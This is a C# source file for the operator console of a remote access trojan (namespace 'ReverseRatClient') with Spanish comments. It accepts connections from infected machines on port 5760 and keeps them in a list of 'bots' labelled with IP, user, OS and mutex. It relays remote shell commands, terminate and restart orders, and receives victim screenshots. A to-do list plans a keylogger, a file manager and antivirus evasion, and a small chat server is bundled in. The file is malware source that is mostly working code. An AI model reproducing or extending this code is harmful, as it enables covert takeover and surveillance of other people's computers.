using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.Diagnostics;
//for Streams
//to run commands concurrently
//for IPEndPoint

namespace ReverseRatClient
{
    /// <summary> 
    /// 
    ///   A Realizar en RAT:  
    ///  ~Conexion de cliente con columnas:  ~[Ip externa y red], ~[Nombre PC/Nombre usuario], ~[S.O.], ~[Mutex]
    ///  ~Actualizacion de items Hastable por cada conexion nueva 
    ///  ~Agregar y borrar de lista de elementos los conectados y no conectados (detectar el momento en el que se desconectan los sockets)    
    ///  ~Configurar ventanas independientes por conexion (control center)
    ///  ~Shell remoto en ventanas independientes por cada conexión (Usar Menu contextual)
    /// - Capacidad de manipular un archivo Ini y agregarlo al servidor  (Configuración archivo ini), Uso de recursos
    /// - Pruebas de uso rudo, manejo de errores para conexiones y desconexiones (red)
    /// - Transferencia de archivos en general
    /// - GUI de Cliente   
    /// - Chequeo de indetectabilidad para antivirus
    /// - Escritorio remoto (Capturas de pantalla, control remoto)
    /// - Validación robusta de multiples escritorios, shells, comandos
    /// - File manager
    /// - Keylogger
    /// 
    ///     
    /// A realizar en Servidor: 
    ///   - Determinar información básica que ira a Archivo ini
    ///   - Cargar configuración de resource al momento de ejecutar
    ///   - Rutina robusta y validada de envio de datos (comandos)
    ///   - Prueba de fuego, que soporte transferencias y actividades paralelas
    ///   - Cifrado de datos    
    /// </summary>


    public partial class Principal : Form
    {
        TcpListener _tcpListener;
        Socket _socketForServer;       
        Thread _thStartListen,_thRunClient;
        Hashtable _listaBots = new Hashtable();
        Miscelanea _msc = new Miscelanea();
        private int _contRepeticion;
        List<UsuariosChat> listaUsuariosChat = new List<UsuariosChat>();
        public List<string> ListaCanales = new List<string>();
        private Socket _socketRepeticion;
        private const int MaxClientesCanal = 50;

        public Principal()
        {
            InitializeComponent();
        }
        
        
        private void Form1_Shown(object sender, EventArgs e)
        {          
            textBox2.Focus();   
                               
        }

        private void StartListen()
        {
            Socket socketEx;
            _tcpListener = new TcpListener(IPAddress.Any, 5760); //Inicia escucha de puertos en el 5760
            _tcpListener.Start();
            toolStripStatusLabel1.Text = @"Escuchando puerto 5760...";
            for (;;)
            {                            
                socketEx = _tcpListener.AcceptSocket();              
                IPEndPoint ipend = (IPEndPoint)socketEx.RemoteEndPoint;
                toolStripStatusLabel1.Text = @"Conexión de " + IPAddress.Parse(ipend.Address.ToString());                
                _socketForServer = socketEx;            
                  
                // Thread nuevo para cada cliente conectado                       
                _thRunClient = new Thread(RunClient);
                _thRunClient.Start();              
            }            
        }


        private void RunClient()
        {
            NetworkStream networkStream;
            StreamWriter streamWriter;
            StreamReader streamReader;
            StringBuilder strInput;
            var socketNuevo = _socketForServer;
            
            networkStream = new NetworkStream(socketNuevo);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);            
            strInput = new StringBuilder();

            while (true)
            {
                try
                {                   
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\r\n");
                }
                catch (Exception err)
                {
                    Cleanup(socketNuevo, streamReader, streamWriter, networkStream);
                    DisplayMessage("<Error en conexion:  " + err.Message + " " +  socketNuevo.GetHashCode() + ">\n");
                    break;
                }
              
                string cadenaEvaluar = EvaluaCadena(strInput, socketNuevo);

                if (cadenaEvaluar.Length == 0) // Evitar repeticion de datos
                {
                    if (strInput.ToString().Length == 2)
                    {
                        if (socketNuevo == _socketRepeticion)
                        {
                            _contRepeticion++;
                        }
                        else
                        {
                            _contRepeticion = 0;
                        }
                        _socketRepeticion = socketNuevo;
                        if (_contRepeticion > 5)
                        {
                             _contRepeticion = 0;
                             DisplayMessage("<Conexion perdida con: " + socketNuevo.GetHashCode() + ">\r\n");
                             string formarCadena273 = "273 " + ObtenerNickPorHash(socketNuevo.GetHashCode().ToString());
                             EnviarBroadCast(formarCadena273, socketNuevo.GetHashCode().ToString(), ObtenerCanalPorHash(socketNuevo.GetHashCode().ToString()));
                             EliminarClienteLista(socketNuevo);
                             Cleanup(socketNuevo, streamReader, streamWriter, networkStream);
                           /*  streamReader.Close();
                             streamWriter.Close();
                             socketNuevo.Close();*/
                             break;
                        }                        
                    }
                    if (strInput.ToString().Length < 300 && strInput.ToString().Length > 2)
                        DisplayMessage(strInput.ToString());                   

                }
                else
                {                   
                    for (int ctx = 0; ctx < ActiveForm.MdiChildren.Length; ctx++) // Salida global de comandos
                    {
                        if (Convert.ToString(ActiveForm.MdiChildren[ctx].Tag) == cadenaEvaluar)
                        {
                            var pnlControl = (PanelDeControl)ActiveForm.MdiChildren[ctx];
                            try
                            {
                                pnlControl.textBox1.AppendText(strInput.ToString().Split('|')[0] + "\r\n");

                                //Formato al texto de Shell
                                if (pnlControl.textBox1.Text.Substring(pnlControl.textBox1.Text.Length - 3, 1) == ">")
                                {
                                    pnlControl.textBox1.Text = pnlControl.textBox1.Text.Substring(0, pnlControl.textBox1.Text.Length - 2);
                                    pnlControl.textBox1.SelectionStart = pnlControl.textBox1.TextLength;
                                    pnlControl.textBox1.ScrollToCaret();
                                }
                            }                            
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.ToString());   
                            }

                        }
                    }
                   


                }
                Application.DoEvents();
                strInput.Remove(0, strInput.Length);                
            }           
        }



        //Evalua cadena para devolver un Hash compatible que identifique a 
        //la ventana en caso de estar la salida redirigida a un hash en especifico
        string EvaluaCadena(StringBuilder cadena, Socket sck)
        {
            string s;
            if (ProcesarComandosRat(cadena, sck, out s)) return s;
            ProcesarComandosChat(cadena, sck);

            return "";

        }




        // Despachador de comandos de la aplicacion, el usuario envia comando y  este es procesado en esta pequeña funcion
        private bool ProcesarComandosRat(StringBuilder cadena, Socket sck, out string s)
        {
            string[] ini;
            // evaluar cadena iniciada
            var cadEv = cadena.ToString();

            if (cadEv.IndexOf("|", StringComparison.Ordinal) > 0)
            {
                if (cadEv.Substring(0, cadEv.IndexOf("|", StringComparison.Ordinal)).Length > 0)
                {
                    var cadRes = cadEv.Substring(0, cadEv.IndexOf("|", StringComparison.Ordinal));
                    if (cadRes == "M1X3R")
                    {
                        //textBox3.Text = CadEv;
                        ini = cadEv.Split('|');
                        AgregaNuevoServer(ini[1], ini[2], ini[3], ini[4], sck.GetHashCode().ToString());
                        _listaBots[cadEv] = sck;

                        string hashSck = sck.GetHashCode().ToString();
                        DisplayMessage("\n<Conexión:" + hashSck + ">\n");
                        EnviarComando("<:asignahash:> " + hashSck, sck);
                        s = "";
                        return true;
                    }

                    string cadenaEvaluar = cadEv.Split('|')[1];
                        
                    //  MessageBox.Show(cadenaEvaluar);
                    for (int ctx = 0; ctx < ActiveForm.MdiChildren.Length; ctx++)
                    {
                        if ( Convert.ToString( ActiveForm.MdiChildren[ctx].Tag) == cadenaEvaluar)
                        {                               
                            s = cadenaEvaluar;
                            return true;
                        }
                    }
                }
            }

            // Comandos
            // Respuesta imagen de captura
            if (cadEv.IndexOf("<:imagen:>") >= 0)
            {
                ProcesarCaptura(cadEv);
            }
            s = "";
            return false;
        }

        private static void ProcesarCaptura(string cadEv) // Procesa captura y la manda al picturebox
        {
            try
            {
                string delimiter = "<:imagen:>";
                // Dividir la cadena utilizando la cadena delimitadora
                string[] split = cadEv.Split(new string[] { delimiter }, StringSplitOptions.None);
                byte[] bytes = Convert.FromBase64String(split[1]);

                string cadenaEvaluar = split[2];

                // Devolver ventana
                for (int ctx = 0; ctx < ActiveForm.MdiChildren.Length; ctx++)
                {
                    if (Convert.ToString(ActiveForm.MdiChildren[ctx].Tag) == cadenaEvaluar)
                    {
                        var pnlControl = (PanelDeControl)ActiveForm.MdiChildren[ctx];
                        using (MemoryStream memoryStream = new MemoryStream(bytes))
                        {
                            Image image = Image.FromStream(memoryStream);
                            pnlControl.pictureBox1.Image = image;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Write(ex.Message);
            }
        }

        int EncontrarIndiceHash(DataGridView dvg, string hash) // Encuentra indice en base al Socket hash como parametro
        {
            for (int j = 0; j < dvg.Rows.Count; j++)
            {
                if (dvg[4, j].Value.ToString().Trim() == hash)
                    return j;
            }
            return -1;
        }


        // Realiza limpieza al desconectarse un cliente
        private void Cleanup(Socket sck, StreamReader strr, StreamWriter strw, NetworkStream nts)
        {
            try
            {
                dataGridView1.Rows.RemoveAt(EncontrarIndiceHash(dataGridView1, sck.GetHashCode().ToString()));
                strr.Close();
                strw.Close();
                nts.Close();
                sck.Close();
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }           
        }



        private void CleanupGeneral()
        {
            try
            {
                _socketForServer.Close();
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }
            toolStripStatusLabel1.Text = @"Conexion perdida";
        }


        

        private delegate void DisplayDelegate(string message);
        private void DisplayMessage(string message)
        {
            if (textBox1.InvokeRequired)
            {
                Invoke(new DisplayDelegate(DisplayMessage), message);
            }
            else
            {
                Application.DoEvents();
                textBox1.AppendText(message);
            }           
        }


        private delegate void NuevoServer(string message, string pcUser, string so, string mutex, string sckHash);
        private void AgregaNuevoServer(string message, string pcUser, string so, string mutex, string sckHash)
        {
            if (dataGridView1.InvokeRequired)
            {
                Invoke(new NuevoServer(AgregaNuevoServer), message, pcUser, so, mutex, sckHash);
            }
            else
            {
                var index = dataGridView1.Rows.Add();
                dataGridView1.Rows[index].Cells["IPEquipo"].Value = message;
                dataGridView1.Rows[index].Cells["NombrePC"].Value = pcUser;
                dataGridView1.Rows[index].Cells["SistemaOperativo"].Value = so;
                dataGridView1.Rows[index].Cells["Mutex"].Value = mutex;
                dataGridView1.Rows[index].Cells["HashSocket"].Value = sckHash;                
            }
        }

        
        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Enter)
                {
                    EnviaComandoTexto();
                }
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }
            
        }

        private void EnviaComandoTexto()
        {
            if (textBox2.Text == @"cls")
            {                
                textBox1.Text = "";
                return;
            }
           
            EnviarComando(textBox2.Text);                      
            textBox2.Text = "";
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (MessageBox.Show(@"¿Desea salir del programa?", @"Salir", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {                
                e.Cancel = false;
                CleanupGeneral();
                Environment.Exit(Environment.ExitCode);
            }
            else
            {
                e.Cancel = true;
            }
            
        }

        private void Form1_Load(object sender, EventArgs e) // Basado en hilos
        {
            ListaCanales.Add("Manga-Anime");
            ListaCanales.Add("Hackers");

            _thStartListen = new Thread(StartListen); // Servidor para chat
            _thStartListen.Start();   
        }

        private void button1_Click(object sender, EventArgs e) // Boton de ejemplo para enviar un comando
        {
             
        }

        private void EnviarComando(string comando) // Enviar comando al elemento seleccionado en Dvw
        {            
            string mensaje = comando;
            string cadenaForm;
            Funciones x = new Funciones();

            cadenaForm = x.FormarCadena(dataGridView1); //Enviar al elemento seleccionado del DataGridView            
            var sckEnviar = (Socket)_listaBots[cadenaForm];
            DisplayMessage("<" + sckEnviar.GetHashCode()  + ">" + comando + "\r\n");
            NetworkStream nStr = new NetworkStream(sckEnviar);
          
            StreamWriter strw = new StreamWriter(nStr);
            StringBuilder strib = new StringBuilder();
            strib.Append(mensaje);
            strw.WriteLine(strib);
            strw.Flush();
            strw.Close();
            nStr.Close();
        }


        public void EnviarComando(string comando, string cadenaInicio) // Enviar comando por cadena inicio
        {
            string mensaje = comando;

            var cadenaForm = cadenaInicio;
            var sckEnviar = (Socket)_listaBots[cadenaForm];
            DisplayMessage("<" + sckEnviar.GetHashCode() + ">" + comando.Trim() +"|");
            NetworkStream nStr = new NetworkStream(sckEnviar);

            StreamWriter strw = new StreamWriter(nStr);
            StringBuilder strib = new StringBuilder();
            strib.Append(mensaje);
            strw.WriteLine(strib);
            strw.Flush();
            strw.Close();
            nStr.Close();
        }





        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            EnviarComando("<:hola:>");
        }

        private void dataGridView1_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            
         
        }

        private void dataGridView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                contextMenuStrip1.Show();
            }
        }

        private void cerrarServidorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count > 0)
            {
                CerrarPanel(dataGridView1.SelectedRows[0].Cells["HashSocket"].Value.ToString());
                EnviarComando("<:terminar:>");
            }
        }

        void CerrarPanel(string hash)
        {
            //MessageBox.Show(hash);
            for (int ctx = 0; ctx < ActiveForm.MdiChildren.Length; ctx++)
            {
                if (Convert.ToString(ActiveForm.MdiChildren[ctx].Tag) == hash)
                {
                    var pnlControl = (PanelDeControl)ActiveForm.MdiChildren[ctx];
                    pnlControl.Close();                    
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
             EnviaComandoTexto();           
        }

        private void abrirVentanaToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (dataGridView1.Rows.Count > 0)
            {
                PanelDeControl ventana = new PanelDeControl();
                Funciones x = new Funciones();              
                ventana.Text = x.FormarCadena(dataGridView1);
                ventana.Tag = dataGridView1.SelectedRows[0].Cells["HashSocket"].Value.ToString();
                _msc.MostrarMdi(ActiveForm, ventana, "PanelDeControl", Convert.ToString(ventana.Tag));
            }
        }

     

        private void button2_Click(object sender, EventArgs e)
        {
            Funciones x = new Funciones();
            var cadenaForm = x.FormarCadena(dataGridView1);
            var sckEnviar = (Socket)_listaBots[cadenaForm];
            MessageBox.Show( sckEnviar.Connected.ToString());
        }
        private void reiniciarServidorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            EnviarComando("<:reiniciar:>");
        }
        private void EnviarComando(string comando, Socket sck)
        {
            string mensaje = comando;

            try
            {
                DisplayMessage("<" + sck.GetHashCode() + ">");
                NetworkStream nStr = new NetworkStream(sck);
                if (nStr == Stream.Null)
                {
                    MessageBox.Show(@"holaa");
                }
                StreamWriter strw = new StreamWriter(nStr);
                StringBuilder strib = new StringBuilder();
                strib.Append(mensaje);
                strw.WriteLine(strib);
                strw.Flush();
                strw.Close();
                nStr.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }



        #region ServidorEshare



        private void button4_Click(object sender, EventArgs e)
        {
            // Mensaje Admin
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                EnviarComando("700 " + textBox4.Text, usr.SocketUsr);
            }
            textBox4.Text = "";
        }


    

        void ProcesarComandosChat(StringBuilder cadena, Socket sck)
        {
            var cadEv = cadena.ToString();

            if (cadEv.Length >= 3)
            {
                switch (cadEv.Substring(0, 3))
                {
                    case "100": // Cadena inicial
                        string nuevoNickName = cadEv.Split(':')[1];
                        string nuevoCanal = cadEv.Split(':')[3];
                        string nuevoCliente = cadEv.Split(':')[0].Substring(3, cadEv.Split(':')[0].Length - 3);

                        if (ValidarNickNameCanal(nuevoNickName, nuevoCanal))
                        {
                            // Avisar a todos que el usuario ingresó al chat
                            string formarCadena264 = "264 " + nuevoNickName;
                            EnviarBroadCast(formarCadena264, sck.GetHashCode().ToString(), nuevoCanal);
                            // Enviar cadena de aceptación y lista de usuarios de canal
                            string formarCadena202 = "202 " + nuevoNickName + ":" + (listaUsuariosChat.Count + 1) + ";" +
                                                     nuevoCanal + ":" + ContarUsuariosCanal(nuevoCanal) + ":" + "0";
                            listaUsuariosChat.Add(new UsuariosChat(nuevoNickName, nuevoCanal, nuevoCliente, sck));
                            EnviarComando(formarCadena202, sck);
                            string formarCadena222 = "222 " + DevolverUsuariosCanal220(sck.GetHashCode().ToString());
                            EnviarComando(formarCadena222, sck);
                        }
                        break;
                    case "220": // Enviar listado de usuarios del canal a peticion de usuario                      
                        string formarCadena222X = "222 " + DevolverUsuariosCanal220(sck.GetHashCode().ToString());
                        EnviarComando(formarCadena222X, sck);
                        break;
                    case "248": //Mensaje publico
                        string mensaje = cadEv.Substring(4, cadEv.Length - 4);
                        string formarCadena270 = "270 " + ObtenerNickPorHash(sck.GetHashCode().ToString()) + ":" + mensaje;
                        EnviarBroadCast(formarCadena270, sck.GetHashCode().ToString(), ObtenerCanalPorHash(sck.GetHashCode().ToString()));
                        break;
                    case "255": // Mensaje Privado
                        string nickDestino = cadEv.Substring(4, cadEv.Length - 4).Split(':')[0];
                        string nickOrigen = ObtenerNickPorHash(sck.GetHashCode().ToString());
                        string mensajeprivado = cadEv.Substring(cadEv.IndexOf(":", 0, StringComparison.Ordinal) + 1);
                        EnviarMensajePrivado(nickOrigen, nickDestino, mensajeprivado);
                        EnviarComando("280 " + nickDestino, sck);
                        break;
                    case "260": // Solicita cambio de canal
                        int numeroUsuarios = 0;
                        string canalOrigen = ObtenerCanalPorHash(sck.GetHashCode().ToString());
                        string canalDestino = cadEv.Substring(4, cadEv.Length - 4).Trim();
                        string nombreUsuarioCanal = ObtenerNickPorHash(sck.GetHashCode().ToString());
                        if (RealizarCambioCanal(canalDestino, ref numeroUsuarios, sck))
                        {
                            string formarCadenaCambioAprobadoCanal = "262 " + canalDestino + ":" + numeroUsuarios + ":" + "0";
                            EnviarComando(formarCadenaCambioAprobadoCanal, sck);
                            string formarCadena263CambiaCanal = "263 " +
                                                                nombreUsuarioCanal + ":" +
                                                                canalDestino;
                            EnviarBroadCast(formarCadena263CambiaCanal, sck.GetHashCode().ToString(), canalOrigen);
                            string formarCadena264 = "264 " + nombreUsuarioCanal;
                            EnviarBroadCast(formarCadena264, sck.GetHashCode().ToString(), canalDestino);
                        }
                        else
                        {
                            string cadenabadRoom = "404 Bad Room Request";
                            EnviarComando(cadenabadRoom, sck);
                        }
                        break;
                    case "300": // solicita lista de canales publicos
                        foreach (var canal in ListaCanales)
                        {
                            string formarCadenaCanal = "310 " + canal + ":0:" + DevolverNumUsuariosCanal(canal) + ":" + MaxClientesCanal;
                            EnviarComando(formarCadenaCanal, sck);
                        }
                        break;

                    case "418": // Peticion de administrador
                    case "451": // Peticion de moderador, screener o speaker                              
                        string[] tokens = cadEv.Split(' ');
                        string nickNameExpulsar = "";
                        if (tokens.Length > 1)
                        {
                            switch (tokens[1].Trim())
                            {
                                case "ADMIN":
                                case "1:":
                                case "2:":
                                case "3:":
                                    string formarCadenaAdm = "413 ";
                                    EnviarComando(formarCadenaAdm, sck);
                                    break;
                                case "KICK":
                                    nickNameExpulsar = cadEv.Substring(9, cadEv.Length - 9).Trim();
                                    Socket socketExp = ObtenerSckPorNick(nickNameExpulsar);                                    
                                    string formarCadenaExpulsado = "276 " + nickNameExpulsar;
                                    EnviarBroadCastAdmin(formarCadenaExpulsado, sck.GetHashCode().ToString(), ObtenerCanalPorHash(socketExp.GetHashCode().ToString()));
                                    EliminarClienteLista(socketExp);
                                    socketExp.Close();
                                    break;
                            }
                        }
                        
                        break;

                }
            }

            // MessageBox.Show(CadEv.Substring(0, 3));
        }


        //Comprobacion al pedido 260 (cambiar canal)
        bool RealizarCambioCanal(string canalDestino, ref int numUsuarios, Socket sck)
        {
            numUsuarios = DevolverNumUsuariosCanal(canalDestino);
            if (numUsuarios < MaxClientesCanal)
            {
                foreach (var usr in listaUsuariosChat)
                {
                    if (sck == usr.SocketUsr)
                    {
                        usr.CanalActual = canalDestino;
                    }
                }
            }
            return numUsuarios < MaxClientesCanal;
        }


        //Elimina un socket de la lista 
        void EliminarClienteLista(Socket sck)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (usr.SocketUsr == sck)
                {
                  //  MessageBox.Show(usr.NickName);
                    listaUsuariosChat.Remove(usr);
                    break;
                }
            }

        }


        //Envia mensaje privado a otro nick
        void EnviarMensajePrivado(string nickOrigen, string nickDestino, string mensaje)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (nickDestino == usr.NickName)
                {
                    EnviarComando("256 " + nickOrigen + ":" + mensaje, usr.SocketUsr);
                }
            }
        }


        // Validacion de nick y canal de usuarios
        bool ValidarNickNameCanal(string nickaValidar, string canalaValidar)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (nickaValidar == usr.NickName)
                {
                    return false;
                }
            }
            int cont = 0;
            foreach (string canal in ListaCanales)
            {
                if (canalaValidar.ToUpper() == canal.ToUpper())
                {
                    cont++;
                }
            }
            if (cont == 0)
                return false;

            return true;
        }


        //Contar usuarios en canal
        int ContarUsuariosCanal(string canal)
        {
            int contador = 0;
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (usr.CanalActual == canal)
                    contador++;
            }
            return contador;
        }


        //Devuelve lista de usuarios del canal donde se encuentra el hash actual
        string DevolverUsuariosCanal220(string hashSocket)
        {

            string canal = ObtenerCanalPorHash(hashSocket);
            string cadenaUsuarios = "";
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                // MessageBox.Show(usr.NickName + " : "+ usr.CanalActual);
                if (usr.CanalActual.ToUpper() == canal.ToUpper())
                {
                    cadenaUsuarios += usr.NickName + ";";
                }
            }
            try
            {
                cadenaUsuarios = cadenaUsuarios.Substring(0, cadenaUsuarios.Length - 1);
            }
            catch (Exception ex)
            { }
            return canal + ":" + cadenaUsuarios;
        }


        // Numero de usuarios en determinado canal
        int DevolverNumUsuariosCanal(string canal)
        {
            int cont = 0;
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (usr.CanalActual.ToUpper() == canal.ToUpper())
                {
                    cont++;
                }
            }

            return cont;
        }


        // Canal por hash de sck
        private string ObtenerCanalPorHash(string hashActual)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                string hashUsuario = usr.SocketUsr.GetHashCode().ToString();
                if (hashUsuario == hashActual)
                {
                    return usr.CanalActual;
                }
            }
            return "No Existe canal";
        }


        //Nick por hash de sck
        private string ObtenerNickPorHash(string hashActual)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (usr.SocketUsr.GetHashCode().ToString() == hashActual)
                {
                    return usr.NickName;
                }
            }
            return "Sin Nick";
        }

        // Obtener Socket recorriendo la lista de usuarios por nickname
        private Socket ObtenerSckPorNick(string nick)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (usr.NickName == nick)
                {
                    return usr.SocketUsr;
                }
            }
            return null;
        }

        void EnviarBroadCast(string cadena, string hashActual, string canal)
        {
            List<UsuariosChat> lista2 = new List<UsuariosChat>();
            lista2.AddRange(listaUsuariosChat);
            foreach (UsuariosChat usr in lista2)
            {
                //Debug.WriteLine("Recorre>" + usr.NickName  + " Hash: " + usr.SocketUsr.GetHashCode());
                if (usr.SocketUsr.GetHashCode().ToString() != hashActual && string.Equals(usr.CanalActual, canal, StringComparison.CurrentCultureIgnoreCase))
                {
                    EnviarComando(cadena, usr.SocketUsr);                    
                }
            }
        }


        // Igual al enviar broadcast, pero enviando comando tambien al nick propio
        void EnviarBroadCastAdmin(string cadena, string hashActual, string canal)
        {
            List<UsuariosChat> lista2 = new List<UsuariosChat>();
            lista2.AddRange(listaUsuariosChat);
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                Debug.WriteLine("Recorre>" + usr.NickName + " Hash: " + usr.SocketUsr.GetHashCode());
                if (string.Equals(usr.CanalActual, canal, StringComparison.CurrentCultureIgnoreCase))
                {
                    EnviarComando(cadena, usr.SocketUsr);
                }
            }
        }



        //Envia mensajes publicos usando el 270, 273


        #endregion




    }
}